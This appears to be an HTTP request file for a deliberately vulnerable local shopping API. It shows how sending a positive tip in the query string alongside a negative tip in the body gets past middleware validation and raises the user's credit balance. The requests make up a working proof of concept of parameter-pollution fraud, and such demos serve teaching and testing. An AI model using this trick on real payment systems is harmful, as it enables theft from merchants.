@base = http://localhost:8000/api/v104

### Create a cart
# @name cheapCart
POST {{base}}/cart
Authorization: Basic sandy:testpassword

### Add an item to the cart
POST {{base}}/cart/{{cheapCart.response.body.cart_id}}/items
Authorization: Basic sandy:testpassword
Content-Type: application/json

{
  "item_id": "1"
}

### This example should be blocked by middleware: you can't tip with a negative value!
POST {{base}}/cart/{{cheapCart.response.body.cart_id}}/checkout
Authorization: Basic sandy:testpassword
Content-Type: application/x-www-form-urlencoded

tip=-50&delivery_address=124 Conch Street

### This example should be blocked by middleware: again, don't tip with a negative value!
POST {{base}}/cart/{{cheapCart.response.body.cart_id}}/checkout
Authorization: Basic sandy:testpassword
Content-Type: application/json

{
  "tip": -50,
  "delivery_address": "124 Conch Street"
}

### This example is vulnerable: you can tip with a negative value if you provide a positive tip in the query params...
# @name cheapOrder
POST {{base}}/cart/{{cheapCart.response.body.cart_id}}/checkout?tip=10
Authorization: Basic sandy:testpassword
Content-Type: application/x-www-form-urlencoded

tip=-50&delivery_address=124 Conch Street

### This example is vulnerable: same for JSON body!
POST {{base}}/cart/{{cheapCart.response.body.cart_id}}/checkout?tip=10
Authorization: Basic sandy:testpassword
Content-Type: application/json

{
  "tip": -50,
  "delivery_address": "124 Conch Street"
}

###
GET {{base}}/orders
Authorization: Basic sandy:testpassword

### Check balance: Sandy got more money than she initially had!
GET {{base}}/account/credits
Authorization: Basic sandy:testpassword

